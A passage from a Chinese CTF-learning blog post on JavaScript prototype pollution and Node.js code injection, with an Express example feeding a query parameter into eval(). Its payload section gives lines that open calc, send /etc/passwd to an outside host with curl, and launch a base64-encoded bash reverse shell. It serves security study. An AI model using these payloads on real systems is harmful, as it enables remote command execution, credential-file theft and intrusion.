的这里构造的函数内的语句是结果是返回了主程序的环境变量配合就可以执行任意命令了最近的漏洞就是配合沙箱逃逸来利用的具体分析可参考复现分析大小写特性在中有几个特殊的字符需要记录一下对于字符经过处理后结果为对于字符经过处理后结果为这个不是在绕一些规则的时候就可以利用这几个特殊字符进行绕过可参考神的文章题实例中的一道题题目部分源码解题时需要登录管理员的用户名但是在登录时函数会对用户输入的用户名进行处理再与管理员用户名进行对比如果输入的用户名与管理员用户名相同就不允许登录但是我们可以看到在之后的一个判断用户是否为管理员的函数中对用户名进行处理的是所以这两个差异就可以使用大小写特性来进行绕过题目中默认的管理员用户名为所以我们指定登录时的用户名为即可绕过和的验证题目完整中一道题分析文件系统模块支持以标准函数建模的方式与文件系统进行交互其中最简单的一个就是文件读取的操作但是我们得分清楚同步和异步区别同步阻塞同步的会阻止事件循环和进一步的执行直到操作完成异步阻塞对于一个操作比如一个当发出一个异步请求后程序不会阻塞在那里等待结果的返回而是继续执行下面的代码当请求成功获取到结果后就会调用回调函数来处理后面的事情这个就是异步简单但不完全正确的说同异步与现实生活的方式相反同步就是事一件一件做做完一件再做下一件而异步是同时开始举个例子导入模块结束这是同步它的输出结果为很明显是等待每个操作完成然后执行下一个操作接下来是异步导入模块现在才结束结束这是就是异步它的输出结果为异步从不等待每个操作完成而是在第一步执行所有操作全局变量展开当前模块的目录名当前模块的文件名这是当前的模块文件的绝对路径符号链接会被解析变量是默认赋值给它可以被赋予新值它会暂时不会绑定到在每个模块中的自由变量是对表示当前模块的对象的引用为方便起见还可以通过全局模块的访问实际上不是全局的而是每个模块本地的模块就不多说了用于引入模块或本地文件可以从引入模块我们常用的全局变量为和提供了几种创建子进程的方式异步方式同步方式经过上面的同步和异步思想的理解创建子进程的同步异步方式应该不难理解异步进程的创建衍生并在该中运行命令完成后将和传给回调函数与类似不同之处在于默认情况下它直接衍生命令而不先衍生衍生新的进程并使用建立的通信通道其允许在父子进程之间发送消息调用指定的模块的同步版本其将阻塞事件循环的同步版本其将阻塞事件循环同步进程的创建和方法是同步的将阻塞事件循环暂停任何其他代码的执行直到衍生的进程退出具体的细节大家可以去官方文档看看参考文章深入理解污染攻击神原型链污染常见漏洞学习与总结和沙箱逃逸常见漏洞学习与总结从零到原型链污染',
  isPost: true,
  isHome: false,
  isHighlightShrink: true,
  isToc: true,
  postUpdate: '2023-10-30 21:30:03',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><div class="back-home-button"><i class="anzhiyufont anzhiyu-icon-grip-vertical"></i><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div></div><a id="site-name" href="/" accesskey="h"><div class="title">hybcx</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 1.05rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 1.05rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 1.05rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 1.05rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 1.05rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 1.05rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 1.05rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 1.05rem;">TryHackMe<sup>42</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 1.05rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 1.05rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 1.05rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 1.05rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
    <i class="anzhiyufont anzhiyu-icon-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/08/"><span class="card-archive-list-date">八月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/07/"><span class="card-archive-list-date">七月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">16</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/06/"><span class="card-archive-list-date">六月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">9</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/05/"><span class="card-archive-list-date">五月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">7</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/04/"><span class="card-archive-list-date">四月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">5</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/03/"><span class="card-archive-list-date">三月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">18</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/02/"><span class="card-archive-list-date">二月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/01/"><span class="card-archive-list-date">一月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%B8%B8%E8%A7%81top%E6%BC%8F%E6%B4%9E/" itemprop="url">常见top漏洞</a></span><span class="article-meta tags"></span></div></div><h1 class="post-title" itemprop="name headline">JavaScript原型链污染学习</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2023-10-29T09:24:57.547Z" title="发表于 2023-10-29 17:24:57">2023-10-29</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2023-10-30T13:30:03.385Z" title="更新于 2023-10-30 21:30:03">2023-10-30</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">14.8k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>52分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="JavaScript原型链污染学习"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为太原"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>太原</span><span class="post-meta-separator"></span><span class="post-meta-commentcount"><i class="anzhiyufont anzhiyu-icon-comments post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2023/10/29/javascript-yuan-xing-lian-wu-ran/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/2023/10/29/javascript-yuan-xing-lian-wu-ran/" itemprop="commentCount"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></a></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://hybcx.xyz/2023/10/29/javascript-yuan-xing-lian-wu-ran/"><header><a class="post-meta-categories" href="/categories/%E5%B8%B8%E8%A7%81top%E6%BC%8F%E6%B4%9E/" itemprop="url">常见top漏洞</a><h1 id="CrawlerTitle" itemprop="name headline">JavaScript原型链污染学习</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">hybcx</span><time itemprop="dateCreated datePublished" datetime="2023-10-29T09:24:57.547Z" title="发表于 2023-10-29 17:24:57">2023-10-29</time><time itemprop="dateCreated datePublished" datetime="2023-10-30T13:30:03.385Z" title="更新于 2023-10-30 21:30:03">2023-10-30</time></header><h1 id="0x01-前言">0x01 前言</h1>
<p>最近新生赛老是碰到JavaScript原型链题目，我纳闷儿呢，这玩意儿也算新生难度了？？？┭┮﹏┭┮终究是我太菜了。话不多说，直接开卷！！！以下几乎都是转载的参考文章，请见谅┭┮﹏┭┮</p>
<h1 id="0x02-危险函数所导致的命令执行">0x02 危险函数所导致的命令执行</h1>
<h2 id="21-eval">2.1 eval()</h2>
<p>eval() 函数可计算某个字符串，并执行其中的的 JavaScript 代码。和PHP中eval函数一样，如果传递到函数中的参数可控并且没有经过严格的过滤时，就会导致漏洞的出现。</p>
<p>简单例子：main.js</p>
<pre><code class="hljs js"><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">"express"</span>);
<span class="hljs-keyword">var</span> app = <span class="hljs-title function_">express</span>();

app.<span class="hljs-title function_">get</span>(<span class="hljs-string">'/eval'</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">req,res</span>){
    res.<span class="hljs-title function_">send</span>(<span class="hljs-built_in">eval</span>(req.<span class="hljs-property">query</span>.<span class="hljs-property">q</span>));
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(req.<span class="hljs-property">query</span>.<span class="hljs-property">q</span>);
})

<span class="hljs-keyword">var</span> server = app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">8888</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"应用实例，访问地址为 http://127.0.0.1:8888/"</span>);
})</code></pre>
<p><strong>漏洞利用：</strong></p>
<p>Node.js中的chile_process.exec调用的是/bash.sh，它是一个bash解释器，可以执行系统命令。在eval函数的参数中可以构造<code>require('child_process').exec('');</code>来进行调用。</p>
<p>弹计算器(windows)：</p>
<pre><code class="hljs js">/<span class="hljs-built_in">eval</span>?q=<span class="hljs-built_in">require</span>(<span class="hljs-string">'child_process'</span>).<span class="hljs-title function_">exec</span>(<span class="hljs-string">'calc'</span>);</code></pre>
<p>读取文件(linux)：</p>
<pre><code class="hljs js">/<span class="hljs-built_in">eval</span>?q=<span class="hljs-built_in">require</span>(<span class="hljs-string">'child_process'</span>).<span class="hljs-title function_">exec</span>(<span class="hljs-string">'curl -F "x=`cat /etc/passwd`" http://vps'</span>);;</code></pre>
<p>反弹shell(linux)：</p>
<pre><code class="hljs js">/<span class="hljs-built_in">eval</span>?q=<span class="hljs-built_in">require</span>(<span class="hljs-string">'child_process'</span>).<span class="hljs-title function_">exec</span>(<span class="hljs-string">'echo YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMjcuMC4wLjEvMzMzMyAwPiYx|base64 -d|bash'</span>);

<span class="hljs-title class_">YmFzaCAtaSA</span>%2BJiAvZGV2L3RjcC8xMjcuMC4wLjEvMzMzMyAwPiYx是bash -i &gt;&amp; <span class="hljs-regexp">/dev/</span>tcp/<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/<span class="hljs-number">3333</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span> <span class="hljs-title class_">BASE64</span>加密后的结果，直接调用会报错。

注意：<span class="hljs-title class_">BASE64</span>加密后的字符中有一个+号需要url编码为%2B(一定情况下)</code></pre>
<p>如果上下文中没有require(类似于Code-Breaking 2018 Thejs)，则可以使用<code>global.process.mainModule.constructor._load('child_process').exec('calc')</code>来执行命令</p>
<p>paypal一个命令执行的例子：</p>
<p><a target="_blank" rel="noopener" href="https://artsploit.blogspot.com/2016/08/pprce2.html">demo.paypal.com] Node.js code injection (RCE)</a></p>
<p>(使用数组绕过过滤，再调用child_process执行命令)</p>
<h2 id="22-类似命令">2.2 类似命令</h2>
<p>间隔两秒执行函数：</p>
<ul>
<li>setInteval(some_function, 2000)</li>
</ul>
<p>两秒后执行函数：</p>
<ul>
<li>setTimeout(some_function, 2000);</li>
</ul>
<p>some_function处就类似于eval函数的参数</p>
<p>输出HelloWorld：</p>
<ul>
<li>Function(“console.log(‘HelloWolrd’)”)()</li>
</ul>
<p>类似于php中的create_function</p>
<p>以上都可以导致命令执行</p>
<h1 id="0x03-javascript类">0x03 JavaScript类</h1>
<h2 id="31-类的声明">3.1 类的声明</h2>
<p>下面是一个基本的 JavaScript 类的声明</p>
<pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Calculator</span> {
    <span class="hljs-title function_">constructor</span>(<span class="hljs-params">num</span>) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">num</span> = num
    }
    <span class="hljs-title function_">applyAdd</span>(<span class="hljs-params">op</span>) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">num</span> += op
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>
    }
    <span class="hljs-title function_">applySub</span>(<span class="hljs-params">op</span>) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">num</span> -= op
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>
    }
    <span class="hljs-keyword">static</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">num1, num2</span>) {
        <span class="hljs-keyword">return</span> num1 + num2
    }
    <span class="hljs-keyword">static</span> <span class="hljs-title function_">sub</span>(<span class="hljs-params">num1, num2</span>) {
        <span class="hljs-keyword">return</span> num1 - num2
    }
}</code></pre>
<p>然后我们创建类的实例</p>
<pre><code class="hljs javascript"><span class="hljs-keyword">let</span> calc = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Calculator</span>(<span class="hljs-number">1</span>)
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(calc.<span class="hljs-property">num</span>)
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(calc.<span class="hljs-title function_">applyAdd</span>(<span class="hljs-number">2</span>).<span class="hljs-property">num</span>)
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Calculator</span>.<span class="hljs-title function_">sub</span>(<span class="hljs-number">11</span>, <span class="hljs-number">5</span>))</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231029173231798.png" alt="image-20231029173231798"></p>
<p>基于我们在其它编程语言的习惯，上面的代码非常易于理解</p>
<p>上述代码中，<code>num</code>称为类<code>Calculator</code>的<strong>属性</strong>，<code>applyAdd、applySub</code>称为类<code>Calculator</code>的<strong>方法</strong>，<code>add、sub</code>称为类<code>Calculator</code>的<strong>静态方法</strong></p>
<p>在 ES6 之前，JavaScript 并没有提供 class 语法，类的功能是基于函数（function）来实现的，如下</p>
<pre><code class="hljs js"><span class="hljs-comment">// 创建类</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Calculator</span>(<span class="hljs-params">num</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">num</span> = num
}
<span class="hljs-title class_">Calculator</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">applyAdd</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">op</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">num</span> += op
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>
}
